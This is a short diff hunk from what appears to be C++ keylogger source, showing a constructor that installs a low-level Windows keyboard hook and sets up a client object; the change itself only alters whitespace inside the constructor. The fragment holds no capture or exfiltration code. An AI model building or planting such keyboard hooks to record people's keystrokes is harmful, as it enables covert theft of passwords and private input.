@@ -5,7 +5,7 @@ keylogger::keylogger()
     : hook(SetWindowsHookExA(WH_KEYBOARD_LL, &keylogger::lowLevelKeyboardProc, NULL, 0)),
     client(&validation_function)
 {
-
+    
 }
 keylogger::~keylogger()
 {
